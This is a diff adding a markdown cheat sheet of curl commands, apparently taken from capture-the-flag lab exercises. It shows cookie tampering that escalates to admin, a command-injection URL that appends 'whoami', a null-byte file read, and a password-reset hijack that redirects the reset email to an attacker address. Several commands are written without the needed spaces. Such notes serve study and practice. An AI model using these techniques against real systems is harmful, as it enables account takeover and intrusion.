@@ -1,0 +1,56 @@
+---
+title: cURL
+description:  cURL is a command-line tool and library for transferring data using various network protocols
+---
+
+## Curl headers
+```bash
+curl http://10.10.129.69 -v
+```
+
+## POST Requests
+```bash
+Curl -X POST http://10.10.122.123/challenges/chal1.php -d 'method=GET&file=/etc/flag1'
+curl -X POST http://10.10.14.127/challenges/chall3.php -d 'method=POST&file=/etc/flag3%00' --output -
+```
+
+## Cookie Tampering
+```bash
+┌──(attacker㉿kali)-[~]
+└─$ curl http://10.10.75.26/cookie-test
+>Not Logged In 
+
+┌──(attacker㉿kali)-[~]
+└─$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.75.26/cookie-test
+>Logged In As A User     
+
+┌──(attacker㉿kali)-[~]
+└─$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.75.26/cookie-test
+>Logged In As An Admin - FLAG{COOKIE_TAMPERING}  
+```
+
+## Command injection
+curl is a great way to test for command injection because you are able to use curl to deliver data to and from an application in your payload
+```bash
+curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
+```
+
+## Password Resets 
+
+```bash
+$ curl'http://10.10.75.26/customers/reset?email=robert%40acmeitsupport.thm'-H'Content-Type: application/x-www-form-urlencoded'-d'username=robert'
+```
+We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.
+
+In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.
+
+The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
+
+```bash
+$ curl'http://10.10.75.26/customers/reset?email=robert%40acmeitsupport.thm'-H'Content-Type: application/x-www-form-urlencoded'-d'username=robert&email=attacker@hacker.com'
+```
+For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm
+
+```bash
+$ curl'http://10.10.75.26/customers/reset?email=robert@acmeitsupport.thm'-H'Content-Type: application/x-www-form-urlencoded'-d'username=robert&email={username}@customer.acmeitsupport.thm'
+```
